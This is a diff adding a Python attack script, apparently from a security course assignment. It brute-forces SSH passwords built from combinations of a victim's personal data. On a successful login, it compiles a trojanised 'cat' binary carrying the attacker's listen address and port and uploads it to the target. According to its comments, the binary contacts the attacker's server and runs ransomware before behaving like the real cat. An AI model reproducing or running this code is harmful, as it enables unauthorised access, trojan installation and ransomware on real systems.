@@ -1,0 +1,76 @@
+#!/usr/bin/python3 
+import sys
+import paramiko
+import itertools
+from base64 import b64encode
+import time
+import subprocess
+f = open("materials/victim.dat")
+lst = []
+for i in f:
+    lst.append(i[:-1])
+print(lst)
+print(1)
+result = []
+for i in range(1, len(lst) + 1):
+    temp = list(itertools.combinations(lst, i))
+    for j in temp:
+        s = ""
+        for k in j:
+            s += k
+        result.append(s)
+
+hostname = sys.argv[1]
+username = "csc2023"
+port = 22
+listen_add = sys.argv[2]
+listen_port = sys.argv[3]
+for passwd in result:
+    try:
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(hostname,port,username,passwd)
+        print(2)
+        '''
+        We have cat.origin and cat.evil
+        construct the program that name as cat.evil | cat.origin
+        cat.evil -> connect to the server and execute the ransomwarm
+                    delete the ransomwarm
+                    run the cat
+        '''
+        with open('cat.evil','r+') as f:
+            contents = f.read()
+            contents = contents.replace('?', str(sys.argv[2]),1)
+            contents = contents.replace('?', str(sys.argv[3]),1)
+            f.seek(0)
+            f.write(contents)
+        subprocess.run(['make'], stdout=subprocess.PIPE)
+        with open('virus','rb') as f:
+            b64 = b64encode(f.read())
+        with open('cat.evil','r+') as f:
+            contents = f.read()
+            contents = contents.replace(str(sys.argv[2]),'?',1)
+            contents = contents.replace(str(sys.argv[3]),'?', 1)
+            f.seek(0)
+            f.write(contents)
+            f.truncate()
+        stdin, stdout, stderr = ssh.exec_command('base64 -d > cat')
+        stdin.write(b64)
+        ssh.exec_command('chmod +x cat')
+        del stdin,stderr,stdout
+        print('pass ',passwd)
+        break
+    except paramiko.AuthenticationException:
+        ssh.close()
+        time.sleep(1)
+        print("bad password ",passwd,"length ",len(passwd))
+        continue
+    except paramiko.ssh_exception.SSHException:
+        time.sleep(10)
+        continue
+    except paramiko.SSHException:
+        time.sleep(10)
+        continue
+    except EOFError:
+        continue
+ssh.close()
